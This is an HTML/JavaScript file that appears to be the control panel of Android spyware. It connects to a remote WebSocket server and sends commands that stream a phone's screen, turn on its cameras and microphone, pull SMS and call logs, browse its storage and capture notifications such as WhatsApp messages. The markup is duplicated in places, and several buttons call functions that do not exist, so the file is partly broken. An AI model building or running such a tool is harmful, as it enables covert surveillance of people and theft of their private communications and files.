<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync - Advanced Controller</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; text-align: center; margin: 0; padding: 20px; }
        .status-container { background: #1e1e1e; display: inline-flex; align-items: center; padding: 10px 20px; border-radius: 30px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        .status-dot { height: 12px; width: 12px; background-color: #555; border-radius: 50%; margin-right: 10px; transition: all 0.3s ease; }
        .online { background-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .offline { background-color: #ff0000; box-shadow: 0 0 5px #ff0000; }
        
        #screen-wrapper { width: 320px; height: 640px; background: #000; margin: 0 auto 20px; border: 8px solid #333; border-radius: 20px; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; position: relative; }
        #display { width: 100%; height: 100%; object-fit: contain; display: block; }

        .controls { display: flex; justify-content: center; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; max-width: 600px; margin-left: auto; margin-right: auto; }
        button { padding: 12px 20px; font-size: 14px; cursor: pointer; border: none; border-radius: 8px; font-weight: 600; color: white; transition: 0.2s; min-width: 120px; }
        
        .btn-start { background-color: #27ae60; }
        .btn-stop { background-color: #c0392b; }
        .btn-record { background-color: #f39c12; }
        .recording-active { background-color: #e74c3c !important; animation: pulse 1.5s infinite; }
        
        /* New Feature Styles */
        .btn-data { background-color: #2980b9; }
        .btn-cam { background-color: #8e44ad; }
        #data-log { width: 100%; max-width: 600px; height: 200px; background: #1e1e1e; margin: 20px auto; border-radius: 10px; padding: 15px; overflow-y: auto; text-align: left; font-family: 'Consolas', monospace; font-size: 12px; border: 1px solid #333; color: #00ff00; }
        .log-entry { border-bottom: 1px solid #333; padding: 5px 0; }
        .log-type { color: #f1c40f; font-weight: bold; margin-right: 5px; }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
        /* Dark Theme Setup */
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #121212; 
            color: white; 
            text-align: center; 
            margin: 0; padding: 20px; 
        }

        /* Device Status Bar */
        .status-container {
            background: #1e1e1e;
            display: inline-flex;
            align-items: center;
            padding: 10px 20px;
            border-radius: 30px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .status-dot {
            height: 12px; width: 12px;
            background-color: #555;
            border-radius: 50%;
            margin-right: 10px;
            transition: all 0.3s ease;
        }
        .online { background-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .offline { background-color: #ff0000; box-shadow: 0 0 5px #ff0000; }
        #status-text { font-weight: bold; color: #aaa; }

        /* Phone Screen Container */
        #screen-wrapper { 
            width: 320px; height: 600px; 
            background: #000; 
            margin: 0 auto 20px; 
            border: 8px solid #333; 
            border-radius: 20px; 
            overflow: hidden; 
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            display: flex; align-items: center; justify-content: center;
            position: relative;
        }
        #display { 
            width: 100%; height: 100%; 
            object-fit: contain; 
            display: block;
        }

        /* Flash Message / Toast Styles */
        #toast {
            visibility: hidden;
            min-width: 250px;
            background-color: #f39c12;
            color: #000;
            text-align: center;
            border-radius: 5px;
            padding: 16px;
            position: fixed;
            z-index: 1000;
            left: 50%;
            bottom: 30px;
            transform: translateX(-50%);
            font-weight: bold;
            box-shadow: 0 0 15px rgba(243, 156, 18, 0.4);
        }
        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }

        /* Button Grid */
        .controls { 
            display: flex; 
            flex-wrap: wrap; 
            justify-content: center; 
            gap: 12px; 
            max-width: 400px; 
            margin: 0 auto; 
        }
        button { 
            padding: 12px 18px; 
            font-size: 14px; 
            cursor: pointer; 
            border: none; 
            border-radius: 8px; 
            font-weight: 600; 
            color: white; 
            flex: 1 1 120px;
            transition: 0.2s;
        }
        button:active { transform: scale(0.96); }

        .btn-start { background: #27ae60; }
        .btn-stop { background: #c0392b; }
        .btn-shot { background: #2980b9; }
        .btn-record { background: #f39c12; }
        
        .recording-active { 
            background: #e74c3c !important; 
            animation: pulse 1.5s infinite; 
        }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } }
        @keyframes fadeout { from { bottom: 30px; opacity: 1; } to { bottom: 0; opacity: 0; } }

        #hidden-canvas { display: none; }
    </style>
</head>
<body>

    <h2>SystemSync Monitor</h2>
<div class="status-container">
        <div id="status-dot" class="status-dot"></div>
        <span id="status-text">Connecting to Server...</span>
    </div>

    <div id="screen-wrapper">
        <img id="display" src="" alt="Waiting for stream...">
    </div>

    <div class="controls">
        <button id="toggleBtn" class="btn-start" onclick="toggleStream()">START SCREEN</button>
        <button id="recordBtn" class="btn-record" onclick="toggleRecording()">START RECORDING</button>
    </div>

    <div class="controls">
        <button class="btn-cam" onclick="sendCommand('START_CAM:BACK')">BACK CAMERA</button>
        <button class="btn-cam" onclick="sendCommand('START_CAM:FRONT')">FRONT CAMERA</button>
        <button class="btn-data" style="background:#d35400" onclick="sendCommand('START_AUDIO')">LIVE MIC</button>
    </div>

    <div class="controls">
        <button class="btn-data" onclick="sendCommand('GET_SMS')">SMS LOGS</button>
        <button class="btn-data" onclick="sendCommand('GET_CALLS')">CALL LOGS</button>
        <button class="btn-data" onclick="sendCommand('GET_FILES:/sdcard/')">FILES</button>
        <button class="btn-stop" onclick="sendCommand('STOP_ALL')">STOP ALL</button>
    </div>

    <div id="data-log">--- SYSTEM LOGS ---<br></div>

    <canvas id="hiddenCanvas" style="display:none;"></canvas>
    <div class="status-container">
        <span id="status-dot" class="status-dot"></span>
        <span id="status-text">Connecting...</span>
    </div>

    <div id="screen-wrapper">
        <img id="display" src="" alt="Screen Off" />
    </div>

    <div id="toast">Enable the Start screen first</div>

    <canvas id="hidden-canvas"></canvas>

    <div class="controls">
        <button id="toggleBtn" class="btn-start" onclick="toggleScreen()">START SCREEN</button>
        <button class="btn-shot" onclick="handleScreenshot()">SCREENSHOT</button>
        <button id="recordBtn" class="btn-record" onclick="handleRecording()">START RECORDING</button>
    </div>

    <script>
      const imgDisplay = document.getElementById('display');
        const statusDot = document.getElementById('status-dot');
        const statusText = document.getElementById('status-text');
        const toggleBtn = document.getElementById('toggleBtn');
        const recordBtn = document.getElementById('recordBtn');
        const dataLog = document.getElementById('data-log');
        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');

        let socket;
        let isStreaming = false;
        let isRecording = false;
        let mediaRecorder;
        let recordedChunks = [];
        let forceRedrawInterval;

        function connect() {
            socket = new WebSocket('wss://mirror-view.onrender.com');

            socket.onopen = () => {
                statusDot.classList.add('online');
                statusText.innerText = "Connected: Device Ready";
                socket.send("I_AM_WEB");
                addLog("System", "Connected to Gateway");
            };

            socket.onmessage = async (event) => {
                const data = event.data;

                // 1. Existing Frame Logic
                if (data.startsWith("FRAME:")) {
                    imgDisplay.src = "data:image/jpeg;base64," + data.substring(6);
                    isStreaming = true;
                    toggleBtn.innerText = "STOP SCREEN";
                    toggleBtn.classList.replace('btn-start', 'btn-stop');
                } 
                
                // 2. New Audio Logic
                else if (data.startsWith("AUDIO:")) {
                    playPCM(data.substring(6));
                }

                // 3. New Notification/WhatsApp Logic
                else if (data.startsWith("NOTIF:")) {
                    const [pkg, title, text] = data.substring(6).split('|');
                    addLog("Notification", `[${pkg}] ${title}: ${text}`);
                }

                // 4. New Data Logic (SMS/Calls/Files)
                else if (data.startsWith("SMS_DATA:") || data.startsWith("CALL_DATA:") || data.startsWith("FILE_DATA:")) {
                    const type = data.split(':')[0];
                    const content = data.substring(data.indexOf(':') + 1);
                    addLog(type, content);
                }

                else if (data === "STATUS:ONLINE") {
                    statusDot.classList.add('online');
                }
            };

            socket.onclose = () => {
                statusDot.className = 'status-dot offline';
                statusText.innerText = "Disconnected. Retrying...";
                setTimeout(connect, 3000);
            };
        }

        function sendCommand(cmd) {
            if (socket && socket.readyState === WebSocket.OPEN) {
                socket.send(cmd);
                addLog("Command", `Sent: ${cmd}`);
            }
        }

        function toggleStream() {
            if (!isStreaming) sendCommand("START_SCREEN");
            else {
                sendCommand("STOP_SCREEN");
                isStreaming = false;
                imgDisplay.src = "";
                toggleBtn.innerText = "START SCREEN";
                toggleBtn.classList.replace('btn-stop', 'btn-start');
            }
        }

        // Optimized Recording Logic (with Redraw Heartbeat)
        function toggleRecording() {
            if (!isRecording) startRecording();
            else stopRecording();
        }

        function startRecording() {
            canvas.width = imgDisplay.naturalWidth || 360;
            canvas.height = imgDisplay.naturalHeight || 640;

            const stream = canvas.captureStream(25);
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
            
            recordedChunks = [];
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = saveVideoFile;
            mediaRecorder.start(1000);

            // Redraw Heartbeat: Ensures recorder never sees a "static" blank frame
            forceRedrawInterval = setInterval(() => {
                if (imgDisplay.complete && imgDisplay.naturalWidth > 0) {
                    ctx.drawImage(imgDisplay, 0, 0, canvas.width, canvas.height);
                }
            }, 100);

            isRecording = true;
            recordBtn.innerText = "STOP RECORDING";
            recordBtn.classList.add('recording-active');
            addLog("Recorder", "Started saving to WebM...");
        }

        function stopRecording() {
            clearInterval(forceRedrawInterval);
            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
            isRecording = false;
            recordBtn.innerText = "START RECORDING";
            recordBtn.classList.remove('recording-active');
        }

        function saveVideoFile() {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `monitor_${new Date().getTime()}.webm`;
            a.click();
            addLog("Recorder", "File downloaded successfully.");
        }

        // Live Audio Player (PCM over Web Audio API)
        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playPCM(base64) {
            const binaryString = atob(base64);
            const len = binaryString.length;
            const bytes = new Int16Array(len / 2);
            for (let i = 0; i < len; i += 2) {
                bytes[i/2] = (binaryString.charCodeAt(i+1) << 8) | binaryString.charCodeAt(i);
            }
            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
            const source = audioCtx.createBufferSource();
            source.buffer = buffer;
            source.connect(audioCtx.destination);
            source.start();
        }

        function addLog(type, message) {
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-type">[${type}]</span> ${message}`;
            dataLog.prepend(entry);
        }

        connect();
    </script>
</body>
</html>
